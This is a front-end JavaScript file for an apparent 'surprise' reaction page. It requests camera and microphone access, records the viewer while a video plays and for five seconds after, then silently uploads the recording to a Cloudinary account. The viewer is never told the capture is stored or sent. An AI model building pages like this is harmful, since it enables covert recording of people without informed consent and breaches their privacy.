"use strict";

// ===== CLOUDINARY (unsigned preset; no API key exposed) =====
const CLOUD_NAME   = "dpzzfcy84";    // your cloud name
const UPLOAD_PRESET= "forBANIKA";    // your unsigned preset
// ===========================================================

const $ = id => document.getElementById(id);
const pages = () => document.querySelectorAll(".page");
const show = id => { pages().forEach(p=>p.classList.remove("show")); const el=$(id); if(el) el.classList.add("show"); };

const btn = $("startBtn");
const mainVideo = $("mainVideo");
const camPreview = $("camPreview");

btn.onclick = ()=>{
  show("loader");

  // Loader runs for 5 seconds, then we ask for permission (NO audio leak)
  setTimeout(async ()=>{
    show("video");

    // Ask permission FIRST (clean UX)
    let stream;
    try{
      stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
    }catch(e){
      alert("Camera & mic permission needed.");
      show("card");
      return;
    }

    // Choose safe format (iPhone fix)
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const recorder = new MediaRecorder(stream, {
      mimeType: isIOS ? "video/mp4" : "video/webm"
    });

    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();

    // Start the surprise video ONLY after permission
    mainVideo.src = "surprise.mp4";
    await mainVideo.play();

    // Tiny live preview dot (muted)
    if(camPreview){
      camPreview.srcObject = stream;
      camPreview.muted = true;
      camPreview.volume = 0;
      await camPreview.play();
    }

    // When the video ends → keep camera running 5 more seconds → then stop recording
    mainVideo.onended = ()=>{
      setTimeout(()=>{
        try{ recorder.stop(); }catch(e){}
      }, 5000); // +5 sec extra reaction window
    };

    // Finalize blob → upload → end screen
    recorder.onstop = async ()=>{
      const blob = new Blob(chunks, { type: isIOS ? "video/mp4" : "video/webm" });
      stream.getTracks().forEach(t=>t.stop());

      if(camPreview){
        camPreview.pause();
        camPreview.srcObject = null;
      }

      await uploadToCloudinary(blob);
      show("end");
    };

  }, 5000);
};

async function uploadToCloudinary(blob){
  const fd = new FormData();
  fd.append("file", blob);
  fd.append("upload_preset", UPLOAD_PRESET);
  const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
    method: "POST",
    body: fd
  });
  const data = await res.json();
  console.log("Uploaded:", data.secure_url);
}